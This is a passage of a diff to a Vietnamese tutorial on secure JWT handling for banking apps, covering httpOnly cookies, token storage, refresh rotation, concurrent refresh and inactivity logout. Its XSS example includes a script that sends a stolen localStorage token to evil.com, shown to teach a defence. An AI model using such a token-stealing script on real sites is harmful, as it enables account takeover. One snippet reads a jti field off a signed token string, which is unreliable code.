+  // 🔹 BƯớc 6: Return success
+  res.json({ message: 'Logged out successfully' });  // ✅ 200 OK
 });
 ```
 
@@ -616,24 +680,38 @@ app.post('/auth/logout', async (req, res) => {
 
 ```typescript
 // ============================================
-// SECURE COOKIE CONFIGURATION
+// 🔒 SECURE COOKIE CONFIGURATION (Cấu hình cookie an toàn)
 // ============================================
 
-// ✅ ĐÚNG: Secure httpOnly Cookie
+// ✅ ĐÚNG: Secure httpOnly Cookie (Banking/Trading MUST có)
 res.cookie('refreshToken', token, {
-  httpOnly: true,    // JavaScript KHÔNG đọc được (chống XSS)
-  secure: true,      // Chỉ gửi qua HTTPS (không qua HTTP)
-  sameSite: 'strict', // Chống CSRF (không gửi cross-site)
-  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
-  path: '/auth/refresh',  // Chỉ gửi tới endpoint refresh
-  domain: '.bank.com',  // Cho phép subdomain
+  httpOnly: true,    // ⚠️ JavaScript KHÔNG đọc được (chống XSS)
+  // document.cookie = undefined (JS không thấy cookie này)
+  // Chỉ server đọc được qua req.cookies
+  
+  secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
+  // Production MUST có, dev localhost có thể tắt
+  
+  sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
+  // 'strict': KHÔNG gửi cookie khi navigate từ site khác
+  // VD: evil.com → bank.com (cookie KHÔNG gửi)
+  
+  maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
+  // Browser tự động xóa cookie sau 30 ngày
+  
+  path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
+  // Giảm exposure - không gửi tới mọi API endpoint
+  // Chỉ POST /auth/refresh mới nhận được cookie
+  
+  domain: '.bank.com',  // 🌐 Cho phép subdomain (api.bank.com, www.bank.com)
+  // Nếu không set = chỉ exact domain
 });
 
-// ❌ SAI: Không secure
+// ❌ SAI: Không secure (⚠️ NEVER dùng trong production)
 res.cookie('refreshToken', token, {
-  httpOnly: false,   // ❌ JS đọc được → XSS risk
-  secure: false,     // ❌ Gửi qua HTTP → MITM attack
-  sameSite: 'none',  // ❌ Gửi cross-site → CSRF risk
+  httpOnly: false,   // ❌ JS đọc được → XSS có thể đánh cắp
+  secure: false,     // ❌ Gửi qua HTTP → MITM (Man-In-The-Middle) attack
+  sameSite: 'none',  // ❌ Gửi cross-site → CSRF attack risk
 });
 
 // ============================================
@@ -670,105 +748,147 @@ res.cookie('refreshToken', token, {
  */
 ```
 
-**B. Token Storage:**
+**B. Token Storage (Lưu Trữ Tokens):**
 
 ```typescript
 // ============================================
-// WHERE TO STORE TOKENS?
+// 💾 WHERE TO STORE TOKENS? (Lưu tokens ở đâu?)
 // ============================================
 
-// ✅ Access Token: MEMORY (JavaScript variable)
-let accessToken: string | null = null;
+// ✅ Access Token: MEMORY (JavaScript variable - biến toàn cục)
+let accessToken: string | null = null;  // 💾 Lưu trong RAM
 
-// Lý do:
-// - Mất khi refresh page (an toàn hơn)
-// - Không bị XSS nếu page refresh
-// - Short-lived (15 phút) nên OK
+// 📝 Lý do dùng memory:
+// - ⚡ Mất khi refresh page (an toàn hơn - attacker không lấy được nếu inject XSS sau)
+// - 🛡️ Không bị XSS nếu page refresh (token biến mất)
+// - ⏱️ Short-lived (15 phút) nên OK (hạn chế thiệt hại)
+// - 🔄 Phải lấy lại từ refresh token khi reload (trade-off UX vs security)
 
-// ✅ Refresh Token: httpOnly Cookie
+// ✅ Refresh Token: httpOnly Cookie (🍪 Server-side cookie)
 // Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict
 
-// Lý do:
-// - JavaScript không đọc được (chống XSS)
-// - Auto gửi với requests (convenient)
-// - Long-lived nhưng secure
+// 📝 Lý do dùng httpOnly cookie:
+// - 🔒 JavaScript KHÔNG đọc được (chống XSS - document.cookie = undefined)
+// - 🤖 Auto gửi với requests (convenient - browser tự động attach)
+// - ⏱️ Long-lived (30 ngày) nhưng secure (httpOnly protection)
+// - 🛡️ SameSite=Strict chống CSRF (không gửi cross-site)
 
-// ❌ NEVER:
-localStorage.setItem('accessToken', token);  // ❌ XSS risk!
-sessionStorage.setItem('accessToken', token);  // ❌ Vẫn XSS risk!
-document.cookie = `accessToken=${token}`;  // ❌ Readable by JS
+// ❌ ⚠️ NEVER LÀM NHƯ NÀY (NGUY HIỂM!):
+localStorage.setItem('accessToken', token);  // ❌ XSS đọc được qua localStorage.getItem()
+sessionStorage.setItem('accessToken', token);  // ❌ Vẫn XSS risk (JS đọc được)
+document.cookie = `accessToken=${token}`;  // ❌ Readable by JS (không httpOnly)
 
 // ============================================
-// XSS Attack Example
+// 🚨 XSS Attack Example (Ví dụ tấn công XSS)
 // ============================================
 
-// Nếu lưu token trong localStorage:
-// Hacker inject script:
+// 💀 Scenario 1: Nếu lưu token trong localStorage
+// Hacker inject malicious script vào website (qua comment, form input, etc.):
 <script>
-  // Steal token
-  const token = localStorage.getItem('accessToken');
+  // 💀 Đánh cắp token từ localStorage
+  const token = localStorage.getItem('accessToken');  // ✅ Thành công!
   
-  // Send to hacker server
+  // 📡 Gửi token về hacker server
   fetch('https://evil.com/steal', {
     method: 'POST',
-    body: JSON.stringify({ token }),
+    body: JSON.stringify({ token }),  // 📦 Gửi token đi
   });
   
-  // Now hacker có token → impersonate user!
+  // 💀 Giờ hacker có token → impersonate user (giả mạo)
+  // → Truy cập account, chuyển tiền, đọc dữ liệu nhạy cảm!
 </script>
 
-// Nếu dùng httpOnly cookie:
-// Hacker inject script:
+// ✅ Scenario 2: Nếu dùng httpOnly cookie
+// Hacker inject cùng script:
 <script>
-  // Try to steal
-  const token = document.cookie; // undefined (httpOnly)
+  // 💀 Thử đánh cắp cookie
+  const token = document.cookie; // ❌ undefined (httpOnly - JS không đọc được)
   
-  // Cannot access! ✅ Secure
+  // ❌ Không lấy được! ✅ An toàn!
+  // Browser chặn truy cập httpOnly cookies từ JavaScript
 </script>
 ```
 
-**C. Token Rotation (Xoay Vòng Token):**
+**C. Token Rotation (Xoay Vòng Token - Advanced Security):**
 
 ```typescript
 // ============================================
-// REFRESH TOKEN ROTATION
+// 🔄 REFRESH TOKEN ROTATION (Mỗi lần refresh → token mới)
 // ============================================
 
-// Backend: Mỗi lần refresh → generate token mới
+// 🔧 Backend: Mỗi lần refresh → generate token mới và revoke token cũ
 app.post('/auth/refresh', async (req, res) => {
-  const oldRefreshToken = req.cookies.refreshToken;
+  const oldRefreshToken = req.cookies.refreshToken;  // 🍪 Lấy token cũ
   
-  // Verify old token
+  // 🔹 Verify old token (kiểm tra hợp lệ)
   const decoded = jwt.verify(oldRefreshToken, SECRET);
+  // → decoded = { jti: "old-token-id", sub: "user123", ... }
   
-  // Generate NEW Access Token
+  // 🔹 Generate NEW Access Token (15 phút mới)
   const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
   
-  // Generate NEW Refresh Token (rotation)
+  // 🔹 Generate NEW Refresh Token (rotation - token mới hoàn toàn)
   const newRefreshToken = jwt.sign(
-    { jti: uuidv4(), sub: decoded.sub },
+    { 
+      jti: uuidv4(),  // 🆔 JWT ID MỚI (khác với old token)
+      sub: decoded.sub  // 👤 Giữ nguyên User ID
+    },
     SECRET,
-    { expiresIn: '30d' }
+    { expiresIn: '30d' }  // ⌛ 30 ngày mới
   );
   
-  // Revoke old Refresh Token
-  await db.revokeRefreshToken(decoded.jti);
+  // 🔹 Revoke old Refresh Token (blacklist token cũ)
+  await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
+  // → Old token không thể dùng lại được
   
-  // Save new Refresh Token
-  await db.saveRefreshToken(newRefreshToken);
+  // 🔹 Save new Refresh Token vào database
+  await db.saveRefreshToken({
+    tokenId: newRefreshToken.jti,  // 🆔 Token ID mới
+    userId: decoded.sub,
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+    // ... device info, IP, etc.
+  });
   
-  // Set new Refresh Token cookie
-  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
+  // 🔹 Set new Refresh Token cookie (ghi đè cookie cũ)
+  res.cookie('refreshToken', newRefreshToken, { 
+    httpOnly: true, 
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 30 * 24 * 60 * 60 * 1000,
+    path: '/auth/refresh',
+  });
   
-  // Return new Access Token
-  res.json({ accessToken: newAccessToken });
+  // 🔹 Return new Access Token về client
+  res.json({ accessToken: newAccessToken });  // ✅ Token mới hoàn toàn
 });
 
-// Lợi ích:
-// - Mỗi lần refresh → token mới
-// - Old token bị revoke → không dùng lại được
-// - Nếu hacker có old token → useless
-// - Detect reuse attack (token revoked mà vẫn dùng)
+// 📊 Lợi ích của Token Rotation:
+// ✅ 🔄 Mỗi lần refresh → token mới (old token bị vô hiệu hóa)
+// ✅ 🗄️ Old token bị revoke → không dùng lại được (single-use)
+// ✅ 💀 Nếu hacker có old token → useless (không dùng được)
+// ✅ 🚨 Detect reuse attack: Nếu token revoked mà vẫn dùng → suspicious activity
+//   → Server log warning, lock account, send email alert
+// ✅ 🔒 Giảm thời gian hữu dụng của stolen token (chỉ dùng được 1 lần)
+
+// 🚨 Reuse Attack Detection:
+// Nếu server nhận được token đã revoke:
+if (tokenRecord.isRevoked) {
+  // 🚨 ALERT: Token bị dùng lại sau khi revoke!
+  // → Có thể là attacker đang dùng stolen token
+  
+  await alertSecurityTeam({  // 📧 Gửi email alert
+    type: 'TOKEN_REUSE_DETECTED',
+    userId: tokenRecord.userId,
+    tokenId: tokenRecord.tokenId,
+  });
+  
+  await lockUserAccount(tokenRecord.userId);  // 🔒 Khóa account tạm thời
+  
+  return res.status(403).json({ 
+    error: 'Token reuse detected',  // ❌ Forbidden
+    message: 'Account locked for security. Please contact support.'
+  });
+}
 ```
 
 ---
@@ -779,104 +899,110 @@ app.post('/auth/refresh', async (req, res) => {
 
 ```typescript
 // ============================================
-// Problem: Race Condition
+// 🚨 Problem: Race Condition (Nhiều requests cùng lúc)
 // ============================================
 
-// User vừa mở 10 tabs, mỗi tab gọi API
-// → 10 requests cùng lúc
-// → Token hết hạn
-// → 10 refresh requests cùng lúc ❌
+// 📋 Scenario: User vừa mở 10 tabs, mỗi tab gọi API
+// → 10 requests cùng lúc (parallel)
+// → Token hết hạn (expired)
+// → 10 refresh requests cùng lúc ❌ (wasteful, inefficient)
+// → 10 access tokens mới (nhưng chỉ cần 1!)
 
 // ============================================
-// Solution: Request Queue với Promise
+// ✅ Solution: Request Queue với Promise (Chỉ 1 refresh request)
 // ============================================
 
-let refreshPromise: Promise<string> | null = null;
+let refreshPromise: Promise<string> | null = null;  // 🔄 Shared promise
 
 async function getValidToken(): Promise<string> {
-  // Nếu token còn hiệu lực → return luôn
+  // 🔹 Check 1: Nếu token còn hiệu lực → return luôn
   if (accessToken && !isTokenExpired(accessToken)) {
-    return accessToken;
+    return accessToken;  // ✅ Dùng token hiện tại
   }
   
-  // Nếu đang refresh → chờ promise hiện tại
-  if (refreshPromise) {
-    return await refreshPromise;
+  // 🔹 Check 2: Nếu đang refresh → chờ promise hiện tại
+  if (refreshPromise) {  // 🔄 Có refresh request đang chạy
+    return await refreshPromise;  // ⏳ Chờ kết quả (không tạo request mới)
+    // → 9 requests còn lại sẽ chờ ở đây
   }
   
-  // Tạo promise mới để refresh
+  // 🔹 Tạo promise mới để refresh (lần đầu tiên)
   refreshPromise = refreshAccessToken().then((newToken) => {
-    refreshPromise = null;  // Reset
-    return newToken;
+    refreshPromise = null;  // ✅ Reset promise (hooked promise xong)
+    return newToken;  // 🔑 Trả về token mới
   });
   
-  return await refreshPromise;
+  return await refreshPromise;  // ⏳ Chờ kết quả đầu tiên
 }
 
 async function apiCall(url: string) {
-  const token = await getValidToken();  // Chờ token valid
+  const token = await getValidToken();  // ⏳ Chờ token valid (block cho đến khi có)
   
   return fetch(url, {
     headers: {
-      'Authorization': `Bearer ${token}`,
+      'Authorization': `Bearer ${token}`,  // 🔑 Dùng token mới (shared)
     },
   });
 }
 
-// Kết quả:
-// - 10 requests đầu tiên trigger refresh
-// - Chỉ 1 refresh request thực sự gửi đi
-// - 9 requests còn lại chờ promise đó
-// - Tất cả dùng chung 1 token mới
+// 📊 Kết quả (Optimized):
+// ✅ 10 requests đầu tiên trigger getValidToken()
+// ✅ Chỉ 1 refresh request thực sự gửi đi (request đầu tiên)
+// ✅ 9 requests còn lại chờ promise đó (await refreshPromise)
+// ✅ Tất cả dùng chung 1 token mới (efficient, consistent)
+// ✅ Giảm tải server (1 request thay vì 10)
 ```
 
 **B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**
 
 ```typescript
 // ============================================
-// AUTO LOGOUT AFTER INACTIVITY
-// (Banking/Trading yêu cầu)
+// ⏰ AUTO LOGOUT AFTER INACTIVITY (Banking/Trading YÊu CẦU)
 // ============================================
 
-class InactivityTimer {
-  private timeout: number = 5 * 60 * 1000;  // 5 phút không hoạt động
-  private timer: NodeJS.Timeout | null = null;
+class InactivityTimer {  // 🕒 Class quản lý inactivity
+  private timeout: number = 5 * 60 * 1000;  // ⌛ 5 phút không hoạt động = logout
+  private timer: NodeJS.Timeout | null = null;  // ⏲️ Timer hiện tại
   
   constructor() {
-    this.startTimer();
-    this.listenActivity();
+    this.startTimer();  // 🚀 Bắt đầu đếm thời gian
+    this.listenActivity();  // 🎯 Lắng nghe user activities
   }
   
-  // Bắt đầu đếm
+  // 🔹 Bắt đầu đếm ngược
   private startTimer() {
-    this.clearTimer();
+    this.clearTimer();  // 🧹 Xóa timer cũ (nếu có)
     
-    this.timer = setTimeout(() => {
-      this.onTimeout();
+    this.timer = setTimeout(() => {  // ⏰ Set timer mới (5 phút)
+      this.onTimeout();  // 🚪 Gọi logout khi timeout
     }, this.timeout);
   }
   
-  // Reset timer khi có activity
+  // 🔄 Reset timer khi có activity (user thao tác)
   private resetTimer() {
-    this.startTimer();
+    this.startTimer();  // 🔁 Đếm lại từ đầu (0 -> 5 phút)
   }
   
-  // Lắng nghe user activity
+  // 🎯 Lắng nghe user activity (mouse, keyboard, touch, scroll)
   private listenActivity() {
-    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
+    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];  // 📝 Các events quan tâm
+    // mousedown: User click chuột
+    // keydown: User nhấn phím
+    // scroll: User cuộn trang
+    // touchstart: User chạm màn hình (mobile)
     
     events.forEach((event) => {
-      document.addEventListener(event, () => {
-        this.resetTimer();
-      }, { passive: true });
+      document.addEventListener(event, () => {  // 🎯 Lắng nghe event
+        this.resetTimer();  // 🔄 Reset timer (user đang hoạt động)
+      }, { passive: true });  // ⚡ Passive = không block scroll performance
     });
   }
   
-  // Timeout → logout
+  // 🚪 Timeout → logout user
   private onTimeout() {
-    console.log('Inactivity timeout - logging out');
+    console.log('Inactivity timeout - logging out');  // 📝 Log event
     
-    // Show warning dialog
+    // ⚠️ Hiển thị warning dialog
     showWarningDialog('Bạn đã không hoạt động trong 5 phút. Vui lòng đăng nhập lại.');
     
     // Logout
